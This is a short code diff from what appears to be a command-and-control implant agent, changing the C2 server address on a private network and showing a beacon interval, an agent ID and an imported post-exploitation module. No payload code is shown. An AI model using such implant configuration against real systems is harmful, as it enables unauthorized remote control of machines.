@@ -23,7 +23,7 @@ if IS_WINDOWS:
     from modules.post_exploit import PostExploit
 
 # === Configuration ===
-C2_URL = "http://192.168.220.141:5001"
+C2_URL = "http://192.168.220.132:5001"
 BEACON_INTERVAL = 10
 agent_id = f"agent_{uuid.uuid4()}"
 # ======================
